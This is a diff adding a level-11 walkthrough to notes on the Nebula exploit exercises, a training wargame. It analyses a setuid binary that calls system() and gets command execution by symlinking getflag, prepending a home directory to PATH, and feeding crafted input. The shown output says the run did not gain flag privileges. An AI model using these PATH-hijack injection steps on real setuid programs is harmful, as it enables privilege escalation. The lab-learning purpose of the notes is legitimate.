@@ -5,6 +5,42 @@ nebula-exercises
 > [ref: exploit-exercises.com/nebula/](https://exploit-exercises.com/nebula/)
 
 
+level 11
+--------
+
+##### see man system
+```bash
+level11@nebula:~$ man system
+Do not use system() from a program with set-user-ID or set-group-ID privileges,  because  strange
+values for some environment variables might be used to subvert system integrity.  Use the exec(3)
+family of functions instead, but not execlp(3) or execvp(3).  system() will not,  in  fact,  work
+properly from programs with set-user-ID or set-group-ID privileges on systems on which /bin/sh is
+bash version 2, since bash 2 drops privileges on startup.
+
+# --> it seems that a setresuid is missing within the 'process' method of basic.c
+# --> even if getflag is injected in buffer, it will not be executed with flag11 suid
+```
+
+##### inpect source code and see man fread
+```c
+// main
+if(fread(buf, length, 1, stdin) != length) // --> length == 1
+{
+    err(1, "fread length");
+}
+
+// process
+buffer[i] ^= key; // --> 'c' = 'b' ^ 1
+```
+##### use a 1 byte length buffer: ['b'] and link 'c' to getflag
+```bash
+level11@nebula:~$ ln -sf /bin/getflag c
+level11@nebula:~$ export PATH=/home/level11/:$PATH
+# execute until null char
+level11@nebula:~$ echo -e "Content-Length: 1\nb" | /home/flag11/flag11 
+getflag is executing on a non-flag account, this doesn't count
+```
+
 level 12
 --------
 
